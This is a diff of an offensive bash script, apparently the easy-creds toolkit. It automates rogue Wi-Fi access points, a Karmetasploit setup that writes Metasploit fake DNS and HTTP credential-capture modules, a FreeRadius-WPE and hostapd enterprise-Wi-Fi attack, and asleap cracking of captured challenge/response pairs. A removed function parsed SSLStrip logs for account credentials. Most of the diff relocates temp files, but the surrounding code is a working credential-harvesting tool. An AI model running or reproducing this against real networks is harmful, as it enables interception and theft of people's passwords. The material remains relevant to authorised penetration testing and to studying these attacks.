+	echo "set SSL true" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 465" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/fakedns" >> /tmp/ec/karma.rc
+	echo "unset TARGETHOST" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 5353" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/fakedns" >> /tmp/ec/karma.rc
+	echo "unset TARGETHOST" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 53" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 80" >> /tmp/ec/karma.rc
+	echo "set SSL false" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 8080" >> /tmp/ec/karma.rc
+	echo "set SSL false" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 443" >> /tmp/ec/karma.rc
+	echo "set SSL true" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 8443" >> /tmp/ec/karma.rc
+	echo "set SSL true" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
 }
 
 
@@ -1156,7 +1203,7 @@ f_karmafinal(){
 	else
 	 xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -P -C 60 -e "default" $MONMODE &
 	fi
-	echo $! > /tmp/ec-karma-pid
+	echo $! > /tmp/ec/ec-karma-pid
 
 	echo -e "\n\e[1;33m[*] Configuring tunneled interface.\e[0m"
 	ifconfig $TUNIFACE up
@@ -1182,7 +1229,7 @@ f_karmafinal(){
 	 y=$(($y+$yoffset))
 	 xterm -geometry "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
 	fi
-	echo $! > /tmp/tail.pid
+	echo $! > /tmp/ec/tail.pid
 	sleep 1
 
 	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface...\e[0m\n"
@@ -1192,12 +1239,12 @@ f_karmafinal(){
 	if [ -z $isxrunning ]; then
 	 echo -e "\n\e[1;33m[*] Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\e[0m\n"
 	 sleep 5
-	 screen -S Karmetasploit -t msfconsole msfconsole -r /tmp/karma.rc
+	 screen -S Karmetasploit -t msfconsole msfconsole -r /tmp/ec/karma.rc
 	else
 	 echo -e "\n\e[1;33m[*] Launching Karmetasploit, this may take a little bit...\e[0m\n"
 	 y=$(($y+$yoffset))
-	 xterm -geometry "$width"x$height-$x+$y -bg black -fg white -T "Karmetasploit" -e msfconsole -r /tmp/karma.rc &
-	 echo $! > /tmp/ec-metasploit-pid
+	 xterm -geometry "$width"x$height-$x+$y -bg black -fg white -T "Karmetasploit" -e msfconsole -r /tmp/ec/karma.rc &
+	 echo $! > /tmp/ec/ec-metasploit-pid
 	fi
 
 	#Enable IP forwarding
@@ -1221,8 +1268,7 @@ f_freeradiusattack(){
 	 sleep 5
 	fi
 
-	pathtoradiusd=$(locate -b -l 1 '\radiusd' | sed 's,/*[^/]\+/*$,,')
-	pathtoradiusconf=$(locate -b -l 1 '\radiusd.conf' | sed 's,/*[^/]\+/*$,,')
+
 	mv $pathtoradiusconf/radiusd.conf $pathtoradiusconf/radiusd.conf.back
 	mv $pathtoradiusconf/clients.conf $pathtoradiusconf/clients.conf.back
 
@@ -1282,17 +1328,6 @@ f_buildclientsconf(){
 ##################################################
 f_hostapd(){
 
-	if [ ! -e /usr/sbin/hostapd ]; then
-	 locate -b '\hostapd' | sed 's,/*[^/]\+/*$,,' > /tmp/hostapd.find
-	  while [ ! -d $pathtohostapd ] && [ -x $pathtohostapd ]; do
-	  for i in $(cat /tmp/hostapd.find); do
-	   pathtohostapd=$i
-	  done
-	 done
-	else
-	 pathtohostapd=/usr/sbin
-	fi
-
 	airmon-ng | grep 'wlan'
 	radwiface=
 	while [ -z $radwiface ]; do
@@ -1310,36 +1345,35 @@ f_hostapd(){
 	 read -p " : " radchannel
 	done
 
-	echo "interface=$radwiface" > /tmp/ec-hostapd.conf
-	echo "driver=nl80211" >> /tmp/ec-hostapd.conf
-	echo "ssid=$radssid" >> /tmp/ec-hostapd.conf
-	echo "logger_stdout=-1" >> /tmp/ec-hostapd.conf
-	echo "logger_stdout_level=0" >> /tmp/ec-hostapd.conf
-	echo "dump_file=/tmp/hostapd.dump" >> /tmp/ec-hostapd.conf
-	echo "ieee8021x=1" >> /tmp/ec-hostapd.conf
-	echo "eapol_key_index_workaround=0" >> /tmp/ec-hostapd.conf
-	echo "own_ip_addr=127.0.0.1" >> /tmp/ec-hostapd.conf
-	echo "auth_server_addr=127.0.0.1" >> /tmp/ec-hostapd.conf
-	echo "auth_server_port=1812" >> /tmp/ec-hostapd.conf
-	echo "auth_server_shared_secret=$radiussecret" >> /tmp/ec-hostapd.conf
-	echo "wpa=1" >> /tmp/ec-hostapd.conf
-	echo "hw_mode=g" >> /tmp/ec-hostapd.conf
-	echo "channel=$radchannel" >> /tmp/ec-hostapd.conf
-	echo "wpa_pairwise=TKIP CCMP" >> /tmp/ec-hostapd.conf
-	echo "wpa_key_mgmt=WPA-EAP" >> /tmp/ec-hostapd.conf
+	echo "interface=$radwiface" > /tmp/ec/ec-hostapd.conf
+	echo "driver=nl80211" >> /tmp/ec/ec-hostapd.conf
+	echo "ssid=$radssid" >> /tmp/ec/ec-hostapd.conf
+	echo "logger_stdout=-1" >> /tmp/ec/ec-hostapd.conf
+	echo "logger_stdout_level=0" >> /tmp/ec/ec-hostapd.conf
+	echo "dump_file=/tmp/hostapd.dump" >> /tmp/ec/ec-hostapd.conf
+	echo "ieee8021x=1" >> /tmp/ec/ec-hostapd.conf
+	echo "eapol_key_index_workaround=0" >> /tmp/ec/ec-hostapd.conf
+	echo "own_ip_addr=127.0.0.1" >> /tmp/ec/ec-hostapd.conf
+	echo "auth_server_addr=127.0.0.1" >> /tmp/ec/ec-hostapd.conf
+	echo "auth_server_port=1812" >> /tmp/ec/ec-hostapd.conf
+	echo "auth_server_shared_secret=$radiussecret" >> /tmp/ec/ec-hostapd.conf
+	echo "wpa=1" >> /tmp/ec/ec-hostapd.conf
+	echo "hw_mode=g" >> /tmp/ec/ec-hostapd.conf
+	echo "channel=$radchannel" >> /tmp/ec/ec-hostapd.conf
+	echo "wpa_pairwise=TKIP CCMP" >> /tmp/ec/ec-hostapd.conf
+	echo "wpa_key_mgmt=WPA-EAP" >> /tmp/ec/ec-hostapd.conf
 }
 
 
 f_freeradiusfinal(){
 	echo -e "\n\e[1;33m[*] Launching the FreeRadius server...\e[0m\n"
-	echo $isxrunning
 	if [ ! -z $isxrunning ]; then
 	 xterm -geometry "$width"x$height-$x+$y -T "radiusd" -bg white -fg black -e radiusd -X -f &
-	 echo $! > /tmp/freeradius.pid
+	 echo $! > /tmp/ec/freeradius.pid
 	 sleep 1
 	else
 	 screen -dmS FreeRadius -t radiusd $pathtoradiusd/radiusd -X -f
-	 echo $! > /tmp/freeradius.pid
+	 echo $! > /tmp/ec/freeradius.pid
 	fi
 
 	echo -e "\n\e[1;33m[*] Launching hostapd...\e[0m\n"
@@ -1347,16 +1381,14 @@ f_freeradiusfinal(){
 
 	if [ ! -z $isxrunning ]; then
 	 y=$(($y+$yoffset))
-	 xterm -geometry "$width"x$height-$x+$y -T "hostapd" -bg black -fg white -e $pathtohostapd/hostapd /tmp/ec-hostapd.conf &
+	 xterm -geometry "$width"x$height-$x+$y -T "hostapd" -bg black -fg white -e $pathtohostapd/hostapd /tmp/ec/ec-hostapd.conf &
 	 sleep 1
 	else
-	 screen -S FreeRadius -t hostapd -X screen $pathtohostapd/hostapd /tmp/ec-hostapd.conf
-	 echo $! > /tmp/hostapd.pid
+	 screen -S FreeRadius -t hostapd -X screen $pathtohostapd/hostapd /tmp/ec/ec-hostapd.conf
+	 echo $! > /tmp/ec/hostapd.pid
 	fi
 
-	freeradiuslog="/usr/local/var/log/radius/freeradius-server-wpe.log"
 	if [ ! -e $freeradiuslog ]; then
-	 findradiuslog=$(locate  -b 'radius.log' | sed 's,/*[^/]\+/*$,,')
 	 touch $findradiuslog/freeradius-server-wpe.log
 	 freeradiuslog=$findradiuslog/freeradius-server-wpe.log
 	fi
@@ -1367,18 +1399,18 @@ f_freeradiusfinal(){
 	if [ ! -z $isxrunning ]; then
 	 y=$(($y+$yoffset))
 	 xterm -geometry "$width"x$height-$x+$y -T "credentials" -bg black -fg green -hold -l -lf $logfldr/freeradius-creds-$(date +%F-%H%M).txt -e tail -f $freeradiuslog &
-	 echo $! > /tmp/tail.pid
+	 echo $! > /tmp/ec/tail.pid
 	 sleep 1
 	else
 	 screen -S FreeRadius -t credentials -X screen tail -f $freeradiuslog/freeradius-server-wpe.log
 	 screen -S easy-creds -X select 2
 	 screen -S easy-creds -X logfile $logfldr/freeradius-creds-$(date +%F-%H%M).txt
 	 screen -S easy-creds -X log
-	 echo $! > /tmp/tail.pid 
+	 echo $! > /tmp/ec/tail.pid 
 	fi
 
 	tshark -i $radwiface -w $logfldr/freeradius-creds-$(date +%F-%H%M).dump &> /dev/null &
-	echo $! > /tmp/tshark.pid
+	echo $! > /tmp/ec/tshark.pid
 }
 
 
@@ -1437,46 +1469,6 @@ f_SSLStrip(){
 
 
 #######################################################
-f_SSLStripLive(){
-	clear
-	f_Banner
-
-	# Live account review idea borrowed from ComaX and his MiTM script YAMAS
-	echo "looseparse() {" > /tmp/looseparse.sh
-	echo "DEFS=\$(locate definitions.sslstrip)" >> /tmp/looseparse.sh
-	echo "LOGPATH=$logfldr/$sslstripfilename" >> /tmp/looseparse.sh
-	echo "i=1" >> /tmp/looseparse.sh
-	echo "while :"  >> /tmp/looseparse.sh
-	echo "do" >> /tmp/looseparse.sh
-	echo "while [ \$i -le \$NUMLINES ]; do" >> /tmp/looseparse.sh
-	echo "	VAL1=\$(awk -v k=\$i 'FNR == k {print \$1}' '\$DEFS')"  >> /tmp/looseparse.sh
-	echo "	VAL2=\$(awk -v k=\$i 'FNR == k {print \$2}' '\$DEFS')"  >> /tmp/looseparse.sh
-	echo "	VAL3=\$(awk -v k=\$i 'FNR == k {print \$3}' '\$DEFS')"  >> /tmp/looseparse.sh
-	echo "	VAL4=\$(awk -v k=\$i 'FNR == k {print \$4}' '\$DEFS')"  >> /tmp/looseparse.sh
-	echo "	GREPSTR=\$(grep -a \$VAL2 \$LOGPATH | grep -a \$VAL3 | grep -a \$VAL4)"  >> /tmp/looseparse.sh
-	echo >> /tmp/looseparse.sh
-	echo "	if [ \$GREPSTR ]; then"  >> /tmp/looseparse.sh
-	echo "		echo -n \$VAL1 '- ' >> /\$PWD/strip-accts.txt"  >> /tmp/looseparse.sh
-	echo "		echo \$GREPSTR | sed -e 's/.*'\$VAL3'=/'\$VAL3'=/' -e 's/&/ /' -e 's/&.*//' >> /\$PWD/strip-accts.txt"  >> /tmp/looseparse.sh
-	echo "	fi"  >> /tmp/looseparse.sh
-	echo >> /tmp/looseparse.sh 
-	echo "	i=\$[\$i+1]"  >> /tmp/looseparse.sh
-	echo "done"  >> /tmp/looseparse.sh
-	echo >> /tmp/looseparse.sh
-	echo "}"  >> /tmp/looseparse.sh
-	echo "looseparse"  >> /tmp/looseparse.sh
-	chmod 755 /tmp/looseparse.sh
-
-	if [ -z $isxrunning ]; then
-	 screen -S easy-creds -t SSLStrip-Accounts -X screen /tmp/looseparse.sh & looseparse=$!
-	else
-	 xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e /tmp/looseparse.sh & looseparse=$!
-	 sleep 2
-	fi
-}
-
-
-##################################################
 f_dsniff(){
 	clear
 	f_Banner
@@ -1526,14 +1518,6 @@ f_EtterLog(){
 ##################################################
 f_freeradiuscreds(){
 
-touch $PWD/asleap-creds.txt
-
-if [ ! -e "/usr/bin/asleap" ]; then
-	asleappath=$(locate -l 1 -b "\asleap"|sed 's,/*[^/]\+/*$,,')
-else
-	asleappath=/usr/bin
-fi
-
 while [ -z "$credlist" ] && [ ! -e "$credlist" ]; do
 	echo -n -e "\nPlease enter the path to your FreeRadius Attack credential list"
 	read -e -p ": " credlist
@@ -1544,23 +1528,29 @@ while [ -z "$wordlist" ] && [ ! -e "$wordlist" ]; do
 	read -e -p ": " wordlist
 done
 
-cat $credlist|egrep 'username|challenge|response'| cut -d " " -f2 > /tmp/freeradius-creds.tmp
-NUMLINES=$(cat /tmp/freeradius-creds.tmp | wc -l)
+	echo -n -e "\n\e[1;33m[*] Please standby, this may take a while...\e[0m"
+
+acreds="$PWD/asleap-creds-$(date +%F-%H%M).txt"
+touch $acreds
+
+cat $credlist|egrep 'username|challenge|response'| cut -d " " -f2 > /tmp/ec/freeradius-creds.tmp
+NUMLINES=$(cat /tmp/ec/freeradius-creds.tmp | wc -l)
 i=1
 
 while [ $i -le "$NUMLINES" ]; do
-	username=$(awk NR==$i /tmp/freeradius-creds.tmp)
+	username=$(awk NR==$i /tmp/ec/freeradius-creds.tmp)
 	i=$[$i+1]
-	challenge=$(awk NR==$i /tmp/freeradius-creds.tmp|tr -d '\r')
+	challenge=$(awk NR==$i /tmp/ec/freeradius-creds.tmp|tr -d '\r')
 	i=$[$i+1]
-	response=$(awk NR==$i /tmp/freeradius-creds.tmp|tr -d '\r')
+	response=$(awk NR==$i /tmp/ec/freeradius-creds.tmp|tr -d '\r')
 	i=$[$i+1]
-	echo
-	echo "Username: $username"
-	$asleappath/asleap -C $challenge -R $response -W $wordlist | grep "password:"| sed -e 's/[\t ]//g;/^$/d'| sed -e 's/:/: /g'
-	echo
+	echo "Username: $username" >> "$acreds"
+	$asleappath/asleap -C $challenge -R $response -W $wordlist | grep "password:"| sed -e 's/[\t ]//g;/^$/d'| sed -e 's/:/: /g' >> "$acreds"
+	echo >> $acreds
 done
-sleep 10
+
+echo -n -e "\n\e[1;33m[*] Your cracked credentials can be found at $acreds...\e[0m"
+sleep 5
 f_mainmenu
 }
 
@@ -1574,7 +1564,7 @@ f_Banner(){
 	echo -e "||\e[1;36me\e[0m |||\e[1;36ma\e[0m |||\e[1;36ms\e[0m |||\e[1;36my\e[0m |||\e[1;36m-\e[0m |||\e[1;36mc\e[0m |||\e[1;36mr\e[0m |||\e[1;36me\e[0m |||\e[1;36md\e[0m |||\e[1;36ms\e[0m ||"
 	echo -e "||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||"
 	echo -e "|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|"
-	echo -e "\e[1;33m 	Version 3.7.6 - Garden of Your Mind\e[0m"
+	echo -e "\e[1;33m 	Version 3.7 - Garden of Your Mind\e[0m"
 	echo
 	echo -e "\e[1;33mAt any time,\e[0m \e[1;36mctrl+c\e[0m \e[1;33m to cancel and return to the main menu\e[0m"
 	echo
@@ -1608,7 +1598,7 @@ f_prereqs(){
 	6) f_msfupdate ;;
 	7) f_aircrackupdate ;;
 	8) f_sslstrip_vercheck ;;
-	9) xdg-open http://www.youtube.com/brav0hax & ;;
+	9) f_howtos ;;
 	10) f_mainmenu ;;
 	*) f_prereqs ;;
 	esac
@@ -1750,8 +1740,9 @@ f_mainmenu(){
 	3) clean=; f_fakeapattacks ;;
 	4) clean=; f_DataReviewMenu ;;
 	5) f_checkexit ;;
-	1968) xdg-open http://www.youtube.com/watch?v=OFzXaFbxDcM & ;;
+	1968) f_pbs ;;
 	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
 	esac
 }
 
@@ -1760,6 +1751,7 @@ if [ "$(id -u)" != "0" ]; then
 	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
 	exit 1
 else
+	mkdir /tmp/ec
 	f_isxrunning
 	f_xtermwindows
 	f_findpaths
